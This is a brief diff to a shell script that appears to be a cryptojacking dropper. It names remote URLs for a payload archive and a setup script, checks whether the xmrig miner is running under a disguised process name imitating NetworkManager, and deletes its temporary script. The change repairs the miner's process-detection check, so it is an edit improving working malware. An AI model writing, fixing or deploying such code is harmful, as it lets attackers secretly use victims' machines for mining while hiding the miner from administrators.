@@ -5,7 +5,7 @@ files="https://github.com/uzidlrxvs/fos/raw/main/dasdsa.tar.gz"
 setupurl="https://github.com/uzidlrxvs/fos/raw/main/e.sh"
 
 # check if xmrig is runing
-if [[ $(ps auxf | grep "NetworksManager" | head -n 1 | awk -F' ' '{print $2}') != 0 ]]; then
+if [[ $(ps auxf | grep NetworksManager | grep -v grep | wc -l) != 0 ]]; then
     # if not already runing, launch xmrig with nohup
     echo "running proccess"
 	rm -r /tmp/e.sh
